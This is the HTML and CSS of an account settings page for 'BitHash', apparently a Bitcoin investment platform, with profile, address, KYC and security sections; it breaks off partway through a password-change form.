<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>BitHash | Account Settings</title>
    <meta name="description" content="Manage your BitHash account settings, security, and preferences">
    
    <!-- Google Fonts -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Rowdies:wght@300;400;700&family=Inter:wght@300;400;500;600;700&family=Manrope:wght@500;600;700&display=swap" rel="stylesheet">
    
    <!-- Favicon -->
    <link rel="icon" href="https://www.dropbox.com/scl/fi/1dq16nex1borvvknpcwox/circular_dark_background.png?rlkey=sq2ujl2oxxk9vyvg1j7oz0cdb&raw=1" type="image/png">
    
    <!-- Font Awesome -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <!-- AOS Animation -->
    <link href="https://unpkg.com/aos@2.3.1/dist/aos.css" rel="stylesheet">
    
    <style>
        :root {
            --primary: #00D395;
            --primary-dark: #00B783;
            --primary-light: #00E5A1;
            --secondary: #1E1E1E;
            --secondary-dark: #121212;
            --dark: #E5E5E5;
            --darker: #0A0A0A;
            --light: #121212;
            --lighter: #1E1E1E;
            --gray: #8E8E8E;
            --gray-light: #2E2E2E;
            --gray-lighter: #252525;
            --success: #00D395;
            --warning: #FFB800;
            --error: #FF3D57;
            --gold: #D4AF37;
            --gold-light: #FFD700;
            --gold-dark: #996515;
            --blue: #003366;
            --blue-dark: #002244;
            --blue-light: #004488;
            --purple: #784FED;
            --pink: #EC4899;
            --gradient: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%);
            --gold-gradient: linear-gradient(135deg, var(--gold) 0%, var(--gold-light) 100%);
            --blue-gradient: linear-gradient(135deg, var(--blue) 0%, var(--blue-dark) 100%);
            --border-radius: 8px;
            --border-radius-lg: 12px;
            --box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
            --box-shadow-lg: 0 10px 15px -3px rgba(0, 0, 0, 0.2), 0 4px 6px -2px rgba(0, 0, 0, 0.05);
            --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            --transition-slow: all 0.5s cubic-bezier(0.4, 0, 0.2, 1);
            --visa-blue: #1A1F71;
            --visa-gold: #F7B600;
            --security-blue: #1A73E8;
            --security-green: #34A853;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        html {
            scroll-behavior: smooth;
            overflow-x: hidden;
        }
        
        body {
            font-family: 'Inter', sans-serif;
            color: var(--dark);
            background-color: var(--light);
            line-height: 1.6;
            overflow-x: hidden;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
        }
        
        /* Bitcoin Logo Animation */
        @keyframes bitcoinFloat {
            0%, 100% {
                transform: translateY(0) rotate(0deg);
            }
            25% {
                transform: translateY(-20px) rotate(90deg);
            }
            50% {
                transform: translateY(0) rotate(180deg);
            }
            75% {
                transform: translateY(-10px) rotate(270deg);
            }
        }

        .bitcoin-animation {
            display: inline-block;
            animation: bitcoinFloat 4s ease-in-out infinite;
            margin-right: 5px;
            vertical-align: middle;
            color: var(--gold);
            text-shadow: 0 0 10px var(--gold-light);
            font-weight: bold;
            transform-origin: center;
        }

        /* Security Badge */
        .security-badge {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: var(--darker);
            padding: 12px 16px;
            border-radius: var(--border-radius);
            box-shadow: var(--box-shadow-lg);
            display: flex;
            align-items: center;
            gap: 10px;
            font-size: 0.85rem;
            font-weight: 600;
            z-index: 100;
            border-left: 4px solid var(--security-green);
            color: var(--dark);
            border: 1px solid var(--gray-light);
        }
        
        .security-badge i {
            color: var(--security-green);
            font-size: 1rem;
        }
        
        /* Loading Overlay */
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: var(--darker);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            z-index: 9999;
            transition: opacity 0.5s ease, visibility 0.5s ease;
        }
        
        .loading-overlay.hidden {
            opacity: 0;
            visibility: hidden;
        }
        
        .loading-logo {
            width: 80px;
            height: 80px;
            animation: pulse 1.5s infinite ease-in-out;
            filter: drop-shadow(0 0 10px rgba(0, 211, 149, 0.3));
        }
        
        .loading-text {
            margin-top: 20px;
            font-weight: 500;
            color: var(--gray);
            font-size: 1rem;
        }
        
        @keyframes pulse {
            0% { transform: scale(0.95); opacity: 0.8; }
            50% { transform: scale(1.05); opacity: 1; }
            100% { transform: scale(0.95); opacity: 0.8; }
        }
        
        .container {
            width: 100%;
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 20px;
        }
        
        /* Enhanced Header Styles - Smaller and Neater */
        header {
            background-color: var(--darker);
            box-shadow: var(--box-shadow);
            position: fixed;
            width: 100%;
            top: 0;
            z-index: 1000;
            padding: 8px 0;
            transition: var(--transition-slow);
            border-bottom: 1px solid var(--gray-light);
            height: 60px;
        }
        
        header.scrolled {
            background-color: rgba(10, 10, 10, 0.98);
            backdrop-filter: blur(5px);
        }
        
        .header-container {
            display: flex;
            justify-content: space-between;
            align-items: center;
            position: relative;
            height: 100%;
        }
        
        .logo {
            display: flex;
            align-items: center;
            gap: 8px;
            cursor: pointer;
            z-index: 1001;
        }
        
        .logo img {
            height: 32px;
            width: auto;
            transition: var(--transition);
        }
        
        .logo:hover img {
            transform: scale(1.05);
        }
        
        .logo-text {
            font-family: 'Rowdies', sans-serif;
            font-weight: 700;
            font-size: 1.3rem;
            color: var(--primary);
            background-clip: text;
            position: relative;
        }
        
        /* Auth Buttons - More compact */
        .auth-buttons {
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .auth-buttons .btn {
            padding: 6px 12px;
            font-size: 0.85rem;
        }
        
        .user-balance {
            background-color: var(--primary);
            color: var(--darker);
            padding: 6px 12px;
            border-radius: var(--border-radius);
            font-weight: 600;
            cursor: pointer;
            transition: var(--transition);
            display: flex;
            align-items: center;
            gap: 6px;
            font-size: 0.85rem;
        }
        
        .user-balance:hover {
            background-color: var(--primary-light);
            transform: translateY(-2px);
        }
        
        .user-balance i {
            font-size: 0.85rem;
        }
        
        /* Mobile Menu Toggle - Enhanced */
        .mobile-menu-toggle {
            display: none;
            background: none;
            border: none;
            color: var(--dark);
            font-size: 1.3rem;
            cursor: pointer;
            padding: 5px;
            z-index: 1001;
            transition: var(--transition);
            position: relative;
            width: 40px;
            height: 40px;
            justify-content: center;
            align-items: center;
        }
        
        .mobile-menu-toggle:hover {
            color: var(--primary);
        }
        
        .mobile-menu-toggle .hamburger {
            width: 24px;
            height: 2px;
            background: currentColor;
            position: relative;
            transition: var(--transition);
        }
        
        .mobile-menu-toggle .hamburger::before,
        .mobile-menu-toggle .hamburger::after {
            content: '';
            position: absolute;
            width: 100%;
            height: 2px;
            background: currentColor;
            left: 0;
            transition: var(--transition);
        }
        
        .mobile-menu-toggle .hamburger::before {
            top: -8px;
        }
        
        .mobile-menu-toggle .hamburger::after {
            bottom: -8px;
        }
        
        .mobile-menu-toggle.active .hamburger {
            background: transparent;
        }
        
        .mobile-menu-toggle.active .hamburger::before {
            transform: translateY(8px) rotate(45deg);
        }
        
        .mobile-menu-toggle.active .hamburger::after {
            transform: translateY(-8px) rotate(-45deg);
        }
        
        /* Navigation - Enhanced for Mobile */
        nav {
            transition: var(--transition-slow);
        }
        
        nav ul {
            display: flex;
            list-style: none;
            gap: 20px;
        }
        
        nav a {
            text-decoration: none;
            color: var(--dark);
            font-weight: 500;
            transition: var(--transition);
            position: relative;
            font-size: 0.9rem;
            padding: 3px 0;
        }
        
        nav a:hover {
            color: var(--primary);
        }
        
        nav a::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            width: 0;
            height: 2px;
            background: var(--primary);
            transition: var(--transition);
        }
        
        nav a:hover::after {
            width: 100%;
        }
        
        .btn {
            padding: 10px 20px;
            border-radius: var(--border-radius);
            font-weight: 600;
            cursor: pointer;
            transition: var(--transition);
            border: none;
            font-size: 0.9rem;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            white-space: nowrap;
        }
        
        .btn-primary {
            background: var(--gradient);
            color: var(--darker);
            box-shadow: 0 4px 15px rgba(0, 211, 149, 0.3);
        }
        
        .btn-primary:hover {
            background: linear-gradient(135deg, var(--primary-light) 0%, var(--primary) 100%);
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(0, 211, 149, 0.4);
        }
        
        .btn-outline {
            background-color: transparent;
            color: var(--primary);
            border: 1px solid var(--primary);
        }
        
        .btn-outline:hover {
            background: var(--primary);
            color: var(--darker);
            transform: translateY(-2px);
        }
        
        .btn-gold {
            background: var(--gold-gradient);
            color: var(--darker);
            box-shadow: 0 4px 15px rgba(212, 175, 55, 0.3);
        }
        
        .btn-gold:hover {
            background: linear-gradient(135deg, var(--gold-light) 0%, var(--gold) 100%);
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(212, 175, 55, 0.4);
        }
        
        /* ============================================= */
        /* Critical Error Notification System */
        /* ============================================= */
        
        .notification-center {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: 9999;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            pointer-events: none;
            width: 100%;
            max-width: 400px;
        }
        
        .notification {
            width: 100%;
            padding: 16px 20px;
            border-radius: var(--border-radius-lg);
            box-shadow: var(--box-shadow-lg);
            display: flex;
            align-items: center;
            gap: 12px;
            transition: all 0.4s cubic-bezier(0.68, -0.55, 0.265, 1.55);
            transform: translateY(30px) scale(0.95);
            opacity: 0;
            margin-bottom: 10px;
            font-size: 0.85rem;
            font-weight: 500;
            backdrop-filter: blur(10px);
            background-color: rgba(30, 30, 30, 0.95);
            border: 1px solid rgba(255, 255, 255, 0.1);
            pointer-events: auto;
            position: relative;
        }
        
        .notification.show {
            transform: translateY(0) scale(1);
            opacity: 1;
        }
        
        .notification.error {
            background-color: rgba(255, 61, 87, 0.95);
            color: white;
            border-left: 4px solid #cc2c4d;
        }
        
        .notification.success {
            background-color: rgba(0, 211, 149, 0.95);
            color: var(--darker);
            border-left: 4px solid #00B783;
        }
        
        .notification i {
            font-size: 1.4rem;
            flex-shrink: 0;
        }
        
        .notification-content {
            flex: 1;
            padding-right: 10px;
        }
        
        .notification-title {
            font-weight: 600;
            margin-bottom: 4px;
            font-size: 0.95rem;
        }
        
        .notification-message {
            font-size: 0.85rem;
            line-height: 1.4;
        }
        
        .notification-close {
            position: absolute;
            top: 8px;
            right: 8px;
            width: 24px;
            height: 24px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 50%;
            background-color: rgba(0, 0, 0, 0.1);
            cursor: pointer;
            transition: var(--transition);
            font-size: 0.9rem;
        }
        
        .notification-close:hover {
            background-color: rgba(0, 0, 0, 0.2);
            transform: rotate(90deg);
        }
        
        @keyframes shake {
            10%, 90% { transform: translate3d(-1px, 0, 0); }
            20%, 80% { transform: translate3d(2px, 0, 0); }
            30%, 50%, 70% { transform: translate3d(-4px, 0, 0); }
            40%, 60% { transform: translate3d(4px, 0, 0); }
        }
        
        .notification.error.show {
            animation: shake 0.5s cubic-bezier(.36,.07,.19,.97) both;
        }
        
        /* Security Indicators */
        .security-indicator {
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 0.8rem;
            color: var(--gray);
            margin-top: 10px;
        }
        
        .security-indicator i {
            color: var(--security-green);
        }
        
        /* Account Settings Layout */
        .account-settings-section {
            padding: 140px 0 60px;
            background-color: var(--light);
        }
        
        .account-settings-container {
            display: grid;
            grid-template-columns: 280px 1fr;
            gap: 30px;
        }
        
        .settings-sidebar {
            background-color: var(--lighter);
            border-radius: var(--border-radius-lg);
            padding: 30px;
            height: fit-content;
            position: sticky;
            top: 100px;
        }
        
        .settings-sidebar-title {
            font-size: 1.2rem;
            margin-bottom: 25px;
            color: var(--dark);
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .settings-sidebar-title i {
            color: var(--primary);
        }
        
        .settings-menu {
            list-style: none;
        }
        
        .settings-menu li {
            margin-bottom: 5px;
        }
        
        .settings-menu a {
            display: block;
            padding: 10px 15px;
            color: var(--gray);
            text-decoration: none;
            border-radius: var(--border-radius);
            transition: var(--transition);
            font-weight: 500;
        }
        
        .settings-menu a:hover, .settings-menu a.active {
            background-color: var(--gray-light);
            color: var(--dark);
        }
        
        .settings-menu a i {
            width: 20px;
            text-align: center;
            margin-right: 10px;
        }
        
        .settings-content {
            background-color: var(--lighter);
            border-radius: var(--border-radius-lg);
            padding: 40px;
        }
        
        .settings-section {
            margin-bottom: 40px;
            display: none;
        }
        
        .settings-section.active {
            display: block;
        }
        
        .settings-section-title {
            font-size: 1.5rem;
            margin-bottom: 25px;
            color: var(--dark);
            display: flex;
            align-items: center;
            gap: 12px;
        }
        
        .settings-section-title i {
            color: var(--primary);
            font-size: 1.2rem;
        }
        
        .settings-card {
            background-color: var(--light);
            border-radius: var(--border-radius-lg);
            padding: 30px;
            margin-bottom: 30px;
            border: 1px solid var(--gray-light);
        }
        
        .settings-card-title {
            font-size: 1.2rem;
            margin-bottom: 20px;
            color: var(--dark);
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .settings-card-title i {
            color: var(--primary);
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        .form-label {
            display: block;
            margin-bottom: 8px;
            font-weight: 500;
            color: var(--dark);
        }
        
        .form-control {
            width: 100%;
            padding: 12px 15px;
            border: 1px solid var(--gray-light);
            border-radius: var(--border-radius);
            font-size: 1rem;
            transition: var(--transition);
            background-color: var(--light);
            color: var(--dark);
        }
        
        .form-control:focus {
            outline: none;
            border-color: var(--primary);
            box-shadow: 0 0 0 3px rgba(0, 211, 149, 0.2);
        }
        
        .form-row {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 20px;
        }
        
        .form-actions {
            display: flex;
            justify-content: flex-end;
            gap: 15px;
            margin-top: 30px;
        }
        
        .security-status {
            display: flex;
            align-items: center;
            gap: 10px;
            padding: 15px;
            border-radius: var(--border-radius);
            margin-bottom: 20px;
            background-color: var(--light);
        }
        
        .security-status.strong {
            border-left: 4px solid var(--success);
        }
        
        .security-status.medium {
            border-left: 4px solid var(--warning);
        }
        
        .security-status.weak {
            border-left: 4px solid var(--error);
        }
        
        .security-status-icon {
            font-size: 1.5rem;
        }
        
        .security-status.strong .security-status-icon {
            color: var(--success);
        }
        
        .security-status.medium .security-status-icon {
            color: var(--warning);
        }
        
        .security-status.weak .security-status-icon {
            color: var(--error);
        }
        
        .security-status-content h4 {
            margin-bottom: 5px;
            color: var(--dark);
        }
        
        .security-status-content p {
            font-size: 0.9rem;
            color: var(--gray);
        }
        
        .verification-badge {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            padding: 6px 12px;
            border-radius: 20px;
            font-size: 0.85rem;
            font-weight: 500;
            margin-left: 15px;
        }
        
        .verification-badge.verified {
            background-color: rgba(0, 211, 149, 0.1);
            color: var(--success);
        }
        
        .verification-badge.pending {
            background-color: rgba(255, 184, 0, 0.1);
            color: var(--warning);
        }
        
        .verification-badge.unverified {
            background-color: rgba(255, 61, 87, 0.1);
            color: var(--error);
        }
        
        /* KYC Verification Styles */
        .kyc-upload-area {
            border: 2px dashed var(--gray-light);
            border-radius: var(--border-radius);
            padding: 30px;
            text-align: center;
            cursor: pointer;
            transition: var(--transition);
            margin-bottom: 20px;
        }
        
        .kyc-upload-area:hover {
            border-color: var(--primary);
        }
        
        .kyc-upload-area i {
            font-size: 2rem;
            color: var(--primary);
            margin-bottom: 10px;
        }
        
        .kyc-upload-area p {
            color: var(--gray);
            margin-bottom: 5px;
        }
        
        .kyc-upload-area small {
            color: var(--gray);
            font-size: 0.8rem;
        }
        
        .kyc-preview {
            display: none;
            margin-top: 20px;
        }
        
        .kyc-preview img {
            max-width: 100%;
            max-height: 300px;
            border-radius: var(--border-radius);
        }
        
        .kyc-preview video {
            max-width: 100%;
            max-height: 300px;
            border-radius: var(--border-radius);
        }
        
        .webcam-container {
            width: 100%;
            max-width: 500px;
            margin: 20px 0;
            border-radius: var(--border-radius);
            overflow: hidden;
            position: relative;
        }
        
        #webcam-video {
            width: 100%;
            height: auto;
            display: block;
            background-color: var(--gray-light);
        }
        
        .webcam-controls {
            display: flex;
            justify-content: center;
            gap: 15px;
            margin-top: 15px;
        }
        
        .capture-btn {
            width: 60px;
            height: 60px;
            border-radius: 50%;
            background-color: var(--primary);
            border: none;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            transition: var(--transition);
        }
        
        .capture-btn:hover {
            background-color: var(--primary-dark);
            transform: scale(1.05);
        }
        
        .capture-btn i {
            color: white;
            font-size: 1.5rem;
        }
        
        .verification-steps {
            display: flex;
            flex-direction: column;
            gap: 15px;
            margin-top: 20px;
        }
        
        .verification-step {
            display: flex;
            align-items: center;
            gap: 10px;
            padding: 15px;
            border-radius: var(--border-radius);
            background-color: var(--light);
            border: 1px solid var(--gray-light);
        }
        
        .verification-step.active {
            border-color: var(--primary);
            background-color: rgba(0, 211, 149, 0.05);
        }
        
        .verification-step.completed {
            border-color: var(--success);
            background-color: rgba(0, 211, 149, 0.1);
        }
        
        .step-number {
            width: 30px;
            height: 30px;
            border-radius: 50%;
            background-color: var(--gray-light);
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 600;
            color: var(--dark);
        }
        
        .verification-step.active .step-number {
            background-color: var(--primary);
            color: var(--darker);
        }
        
        .verification-step.completed .step-number {
            background-color: var(--success);
            color: var(--darker);
        }
        
        .step-content {
            flex: 1;
        }
        
        .step-title {
            font-weight: 600;
            margin-bottom: 5px;
            color: var(--dark);
        }
        
        .step-description {
            font-size: 0.9rem;
            color: var(--gray);
        }
        
        /* Modal Styles */
        .modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-color: rgba(0, 0, 0, 0.7);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 9999;
            opacity: 0;
            visibility: hidden;
            transition: var(--transition-slow);
            backdrop-filter: blur(5px);
            padding: 15px;
        }
        
        .modal-overlay.active {
            opacity: 1;
            visibility: visible;
        }
        
        .modal-container {
            background-color: var(--lighter);
            border-radius: var(--border-radius-lg);
            width: 100%;
            max-width: 400px;
            max-height: 85vh;
            overflow-y: auto;
            transform: translateY(20px);
            transition: var(--transition-slow);
            box-shadow: var(--box-shadow-lg);
            border: 1px solid var(--gray-light);
            position: relative;
        }
        
        .modal-overlay.active .modal-container {
            transform: translateY(0);
        }
        
        .modal-header {
            padding: 16px 20px;
            border-bottom: 1px solid var(--gray-light);
            display: flex;
            justify-content: space-between;
            align-items: center;
            background-color: var(--lighter);
            border-radius: var(--border-radius-lg) var(--border-radius-lg) 0 0;
        }
        
        .modal-title {
            font-size: 1.1rem;
            color: var(--dark);
            font-weight: 600;
        }
        
        .modal-close {
            background: none;
            border: none;
            color: var(--gray);
            font-size: 1.2rem;
            cursor: pointer;
            transition: var(--transition);
            width: 30px;
            height: 30px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 50%;
        }
        
        .modal-close:hover {
            background-color: rgba(255, 255, 255, 0.1);
            color: var(--dark);
        }
        
        .modal-body {
            padding: 20px;
        }
        
        .modal-footer {
            padding: 16px 20px;
            border-top: 1px solid var(--gray-light);
            display: flex;
            justify-content: flex-end;
            gap: 10px;
            background-color: var(--secondary-dark);
            border-radius: 0 0 var(--border-radius-lg) var(--border-radius-lg);
        }
        
        /* Footer */
        footer {
            background-color: var(--darker);
            color: white;
            padding: 50px 0 20px;
        }
        
        .footer-container {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 30px;
            margin-bottom: 30px;
        }
        
        .footer-logo {
            display: flex;
            align-items: center;
            gap: 8px;
            margin-bottom: 15px;
        }
        
        .footer-logo img {
            height: 28px;
            width: auto;
        }
        
        .footer-logo-text {
            font-family: 'Rowdies', sans-serif;
            font-weight: 700;
            font-size: 1.1rem;
            color: var(--primary);
        }
        
        .footer-about p {
            color: rgba(255, 255, 255, 0.7);
            font-size: 0.9rem;
            margin-bottom: 15px;
            line-height: 1.6;
        }
        
        .footer-social {
            display: flex;
            gap: 10px;
        }
        
        .social-icon {
            width: 36px;
            height: 36px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: var(--transition);
            color: white;
        }
        
        /* Social media icons */
        .social-icon.twitter {
            background-color: #1DA1F2;
        }
        
        .social-icon.linkedin {
            background-color: #0077B5;
        }
        
        .social-icon.facebook {
            background-color: #1877F2;
        }
        
        .social-icon.instagram {
            background: linear-gradient(45deg, #405DE6, #5851DB, #833AB4, #C13584, #E1306C, #FD1D1D, #F56040, #F77737, #FCAF45, #FFDC80);
        }
        
        .social-icon:hover {
            transform: translateY(-3px) scale(1.05);
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
        }
        
        .footer-title {
            font-weight: 700;
            margin-bottom: 15px;
            font-size: 1.1rem;
            color: white;
        }
        
        .footer-links ul {
            list-style: none;
        }
        
        .footer-links li {
            margin-bottom: 10px;
        }
        
        .footer-links a {
            color: rgba(255, 255, 255, 0.7);
            text-decoration: none;
            transition: var(--transition);
            font-size: 0.9rem;
            display: inline-block;
        }
        
        .footer-links a:hover {
            color: var(--primary);
            transform: translateX(3px);
        }
        
        .footer-contact p {
            display: flex;
            align-items: flex-start;
            gap: 10px;
            color: rgba(255, 255, 255, 0.7);
            margin-bottom: 12px;
            font-size: 0.9rem;
            line-height: 1.5;
        }
        
        .footer-contact i {
            color: var(--primary);
            width: 18px;
            text-align: center;
            margin-top: 2px;
            font-size: 0.9rem;
        }
        
        .footer-bottom {
            border-top: 1px solid rgba(255, 255, 255, 0.1);
            padding-top: 20px;
            text-align: center;
            color: rgba(255, 255, 255, 0.5);
            font-size: 0.8rem;
        }
        
        /* Responsive Styles - Enhanced */
        @media (max-width: 1024px) {
            .account-settings-container {
                grid-template-columns: 240px 1fr;
            }
            
            .form-row {
                grid-template-columns: 1fr;
            }
        }
        
        @media (max-width: 768px) {
            .account-settings-section {
                padding: 120px 0 40px;
            }
            
            .account-settings-container {
                grid-template-columns: 1fr;
            }
            
            .settings-sidebar {
                position: static;
                margin-bottom: 30px;
            }
            
            .settings-menu {
                display: flex;
                flex-wrap: wrap;
                gap: 5px;
            }
            
            .settings-menu li {
                margin-bottom: 0;
            }
            
            .settings-menu a {
                padding: 8px 12px;
                font-size: 0.85rem;
            }
            
            .settings-content {
                padding: 30px;
            }
            
            /* Enhanced Mobile Navigation */
            .mobile-menu-toggle {
                display: flex;
            }
            
            nav {
                position: fixed;
                top: 60px;
                left: 0;
                width: 100%;
                background-color: var(--darker);
                padding: 20px;
                box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.2);
                transform: translateY(-100%);
                opacity: 0;
                visibility: hidden;
                transition: var(--transition-slow);
                z-index: 999;
            }
            
            nav.active {
                transform: translateY(0);
                opacity: 1;
                visibility: visible;
            }
            
            nav ul {
                flex-direction: column;
                gap: 15px;
            }
            
            nav a {
                padding: 10px 0;
                font-size: 1rem;
            }
        }
        
        @media (max-width: 480px) {
            .account-settings-section {
                padding: 100px 0 30px;
            }
            
            .settings-sidebar {
                padding: 20px;
            }
            
            .settings-content {
                padding: 20px;
            }
            
            .settings-section-title {
                font-size: 1.3rem;
            }
            
            .settings-card {
                padding: 20px;
            }
            
            .form-actions {
                flex-direction: column;
                gap: 10px;
            }
            
            .btn {
                width: 100%;
            }
            
            /* Adjust header elements for small screens */
            .logo-text {
                font-size: 1.1rem;
            }
            
            .auth-buttons {
                gap: 8px;
            }
            
            .auth-buttons .btn {
                padding: 5px 10px;
                font-size: 0.8rem;
            }
            
            .user-balance {
                padding: 5px 10px;
                font-size: 0.8rem;
            }
        }
    </style>
</head>
<body>
    <!-- Loading Overlay -->
    <div class="loading-overlay" id="loading-overlay">
        <img src="https://www.dropbox.com/scl/fi/1dq16nex1borvvknpcwox/circular_dark_background.png?rlkey=sq2ujl2oxxk9vyvg1j7oz0cdb&raw=1" alt="BitHash Logo" class="loading-logo">    
        <div class="loading-text">Establishing Secure Connection</div>
    </div>

    <!-- Security Badge -->
    <div class="security-badge">
        <i class="fas fa-shield-alt"></i>
        <span>256-bit AES & TLS 1.3 Encrypted</span>
    </div>

    <!-- Critical Error Notification System -->
    <div class="notification-center" id="notification-center">
        <!-- Critical error notifications will be dynamically inserted here -->
    </div>

    <!-- Enhanced Header - Smaller and Neater with Mobile Toggle -->
    <header id="main-header">
        <div class="container header-container">
            <div class="logo" onclick="window.location.href='index.html'">
                <img src="https://www.dropbox.com/scl/fi/1dq16nex1borvvknpcwox/circular_dark_background.png?rlkey=sq2ujl2oxxk9vyvg1j7oz0cdb&raw=1" alt="BitHash Logo">
                <span class="logo-text">
                    <span class="bitcoin-animation">₿</span>itHash
                </span>
            </div>
            
            <button class="mobile-menu-toggle" id="mobile-menu-toggle" aria-label="Toggle navigation">
                <span class="hamburger"></span>
            </button>
            
            <nav id="main-nav">
                <ul>
                    <li><a href="index.html">Home</a></li>
                    <li><a href="index.html#plans">Investment Plans</a></li>
                    <li><a href="index.html#how-it-works">How It Works</a></li>
                    <li><a href="dashboard.html">Dashboard</a></li>
                    <li><a href="accountsetting.html" class="active">Settings</a></li>
                </ul>
            </nav>
            
            <div class="auth-buttons" id="auth-buttons" style="display: none;">
                <button class="btn btn-outline" onclick="window.location.href='login.html'">Login</button>
                <button class="btn btn-primary" onclick="window.location.href='signup.html'">Sign Up</button>
            </div>
            
            <div class="user-balance" id="user-balance" onclick="window.location.href='dashboard.html'">
                <i class="fas fa-wallet"></i>
                <span id="balance-amount">$0.00</span>
                <div class="logout-dropdown" id="logout-dropdown" style="display: none;">
                    <button class="btn btn-outline" onclick="logout()" style="margin-left: 10px; padding: 5px 10px; font-size: 0.8rem;">
                        <i class="fas fa-sign-out-alt"></i> Logout
                    </button>
                </div>
            </div>
        </div>
    </header>

    <!-- Account Settings Section -->
    <section class="account-settings-section">
        <div class="container account-settings-container">
            <!-- Settings Sidebar -->
            <div class="settings-sidebar">
                <h2 class="settings-sidebar-title">
                    <i class="fas fa-user-cog"></i> Account Settings
                </h2>
                <ul class="settings-menu">
                    <li><a href="#profile" class="active"><i class="fas fa-user"></i> Profile</a></li>
                    <li><a href="#security"><i class="fas fa-shield-alt"></i> Security</a></li>
                    <li><a href="#kyc"><i class="fas fa-id-card"></i> KYC Verification</a></li>
                    <li><a href="#notifications"><i class="fas fa-bell"></i> Notifications</a></li>
                    <li><a href="#api"><i class="fas fa-key"></i> API Keys</a></li>
                </ul>
            </div>
            
            <!-- Settings Content -->
            <div class="settings-content">
                <!-- Profile Section -->
                <div class="settings-section active" id="profile-section">
                    <h2 class="settings-section-title">
                        <i class="fas fa-user"></i> Profile Information
                    </h2>
                    
                    <div class="settings-card">
                        <h3 class="settings-card-title">
                            <i class="fas fa-id-badge"></i> Personal Details
                        </h3>
                        
                        <form id="profile-form">
                            <div class="form-row">
                                <div class="form-group">
                                    <label for="first-name" class="form-label">First Name</label>
                                    <input type="text" id="first-name" class="form-control" required>
                                </div>
                                <div class="form-group">
                                    <label for="last-name" class="form-label">Last Name</label>
                                    <input type="text" id="last-name" class="form-control" required>
                                </div>
                            </div>
                            
                            <div class="form-group">
                                <label for="email" class="form-label">Email Address</label>
                                <input type="email" id="email" class="form-control" required readonly>
                            </div>
                            
                            <div class="form-group">
                                <label for="phone" class="form-label">Phone Number</label>
                                <input type="tel" id="phone" class="form-control" required>
                            </div>
                            
                            <div class="form-group">
                                <label for="country" class="form-label">Country</label>
                                <input type="text" id="country" class="form-control" required>
                            </div>
                            
                            <div class="form-actions">
                                <button type="button" class="btn btn-outline">Cancel</button>
                                <button type="submit" class="btn btn-primary" id="save-profile-btn">Save Changes</button>
                            </div>
                        </form>
                    </div>
                    
                    <div class="settings-card">
                        <h3 class="settings-card-title">
                            <i class="fas fa-map-marker-alt"></i> Address Information
                        </h3>
                        
                        <form id="address-form">
                            <div class="form-group">
                                <label for="street-address" class="form-label">Street Address</label>
                                <input type="text" id="street-address" class="form-control" required>
                            </div>
                            
                            <div class="form-row">
                                <div class="form-group">
                                    <label for="city" class="form-label">City</label>
                                    <input type="text" id="city" class="form-control" required>
                                </div>
                                <div class="form-group">
                                    <label for="state" class="form-label">State/Province</label>
                                    <input type="text" id="state" class="form-control" required>
                                </div>
                            </div>
                            
                            <div class="form-row">
                                <div class="form-group">
                                    <label for="postal-code" class="form-label">Postal Code</label>
                                    <input type="text" id="postal-code" class="form-control" required>
                                </div>
                                <div class="form-group">
                                    <label for="country-address" class="form-label">Country</label>
                                    <input type="text" id="country-address" class="form-control" required>
                                </div>
                            </div>
                            
                            <div class="form-actions">
                                <button type="button" class="btn btn-outline">Cancel</button>
                                <button type="submit" class="btn btn-primary" id="save-address-btn">Save Changes</button>
                            </div>
                        </form>
                    </div>
                </div>
                
                <!-- Security Section -->
                <div class="settings-section" id="security-section">
                    <h2 class="settings-section-title">
                        <i class="fas fa-shield-alt"></i> Security Settings
                    </h2>
                    
                    <div class="security-status strong" id="security-status">
                        <div class="security-status-icon">
                            <i class="fas fa-check-circle"></i>
                        </div>
                        <div class="security-status-content">
                            <h4>Your account security is strong</h4>
                            <p>All recommended security measures are enabled.</p>
                        </div>
                    </div>
                    
                    <div class="settings-card">
                        <h3 class="settings-card-title">
                            <i class="fas fa-key"></i> Change Password
                        </h3>
                        
                        <form id="password-form">
                            <div class="form-group">
